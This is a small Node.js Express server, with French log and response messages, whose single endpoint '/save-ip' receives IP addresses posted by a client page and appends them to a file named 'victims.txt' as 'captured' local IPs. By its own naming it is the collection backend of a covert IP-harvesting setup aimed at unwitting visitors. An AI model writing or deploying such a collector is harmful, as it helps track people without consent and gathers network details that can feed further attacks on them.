const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/save-ip', (req, res) => {
    const { ip } = req.body;
    const data = `Adresse IP locale capturée : ${ip}\n\n`;
    fs.appendFile('victims.txt', data, (err) => {
        if (err) {
            console.error('Erreur lors de l\'enregistrement de l\'adresse IP:', err);
            res.status(500).send('Erreur lors de l\'enregistrement de l\'adresse IP');
        } else {
            res.send('Adresse IP enregistrée avec succès');
        }
    });
});

app.listen(PORT, () => {
    console.log(`Serveur en cours d'exécution sur http://localhost:${PORT}`);
});